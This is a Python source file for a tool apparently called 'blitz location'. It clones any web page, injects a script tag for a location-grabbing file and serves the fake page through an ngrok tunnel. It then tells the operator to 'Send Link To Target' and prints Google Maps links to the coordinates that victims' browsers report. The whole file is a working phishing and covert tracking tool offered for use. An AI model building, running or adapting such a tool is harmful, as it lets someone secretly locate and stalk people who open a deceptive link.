from pyfiglet import Figlet
from pyngrok import ngrok
from colorama import Fore
from subprocess import Popen
import time
import os
import json
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import lxml
from termcolor import colored

def banner():
	f = Figlet(font='slant')
	print("\n\n")
	print(colored("\t\t\t ⢠⣴⣿⣦⣄","red"))
	print(colored("\t\t\t⠀⡄⠙⣿⣿⣿⣦⠀","red"))
	print(colored("\t\t\t⢰⣷⣾⣿⣿⣿⡟","red"))
	print(colored("\t\t\t⠈⠋ ⣿⣿⣿⢄","red"))
	print(colored("\t\t\t  ⣼⣿⣿⣿⡓⣄⠀","red"))
	print(colored("\t\t\t ⡈⣿⣿⣿⣿⡿⠂⠈⠀","red"))
	print(colored("\t\t\t⠀ ⣇⠛⢿⣿⣯⠀","red"))
	print(colored("\t\t\t⠀⠀  ⣿⣿⠀","red"))
	print(colored("\t\t\t  ⣀⣼⣿⠀","red"))
	print(colored("\t\t\t⣾⣿⣿⣿⣿⣿⣷⣤⠀⠀","green"))
	print(colored("\t\t\t⠋⠋⠋⠋⠋⠋⠋⠋⠋⠀","green"))
	print(colored(f.renderText("blitz location"),"green"))
	print(colored("                                               developed by mmk","red"))
	print(colored("                                               version 1.0","red"))
	print("\n\n")
	print(colored("\tPlease run program with admin privilege","blue"))
	print("\n")

def deafult_server():
	with open("logs/location_log.log","w") as deafult:
		Popen(('php','-S','localhost:8786'),stdout=deafult,stderr=deafult)
def clone_webpage():
	url_to_clone = input(colored("Enter url to clone: ","green"))
	clone_html = requests.get(url_to_clone)
	clone_html = clone_html.text
	soup = BeautifulSoup(clone_html, 'lxml')
	parsed_uri = urlparse(url_to_clone)
	domain = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
	for s in soup.find_all('script'):
		url = s.get('src')
		if url is not None:
                	if not url.startswith('http'):
                		clone_html = clone_html.replace(url, domain + url)
        
	for css in soup.find_all('link'):
        	url = css.get('href')
        	if url is not None:
        		if not url.startswith('http'):
                    		clone_html = clone_html.replace(url, domain + url)

	for img in soup.find_all('img'):
		url = img.get('src')
		if url is not None:
                	if not url.startswith('http'):
                    		clone_html = clone_html.replace(url, domain + url)
	return clone_html
def write_webpage(content):
	f = open('index.html','w')
	f.write('<script src="get_loca.js"></script>')
	f.write(content)	
	f.close()
			
def recv_loc():
	time.sleep(4)
	stat_file_ip = str(os.stat('result.json').st_size)
	file_ip  = open('result.json',"r")
	i = file_ip.read()
	try:
        	infor = json.loads(i)
        	for value in infor['info']:
        		print(Fore.WHITE+"\n Google Map Link : "+Fore.GREEN+f"https://www.google.com/maps/place/{value['lat']}+{value['lon']}")
        		print(Fore.GREEN+"\n [!] "+Fore.WHITE+"got location  (: ")
        		file_recv = open("result.json","w")
        		file_recv.write("")
        		file_recv.close()
        
	except:
		haha = 0
def ngrok_token_check():
	n = open('config.json','r')
	no = n.read()
	token = json.loads(no)
	ngrok_token = token['ngrok_token']
	n.close()
	if not ngrok_token:
		ngrok_token = input("Enter you ngrok token: ")
		print("\n\n")
		p = open("config.txt","w")
		p.write(ngrok_token)
		
	return ngrok_token
		
	
def main():
	banner()
	ngrok_token = ngrok_token_check()
	content = clone_webpage()
	write_webpage(content)
	deafult_server()
	a = ngrok.connect(8786,"http",auth_token=ngrok_token)
	print(Fore.GREEN+"\n [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
	print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
	while True:
		recv_loc()
		
if __name__ == '__main__':
	main()
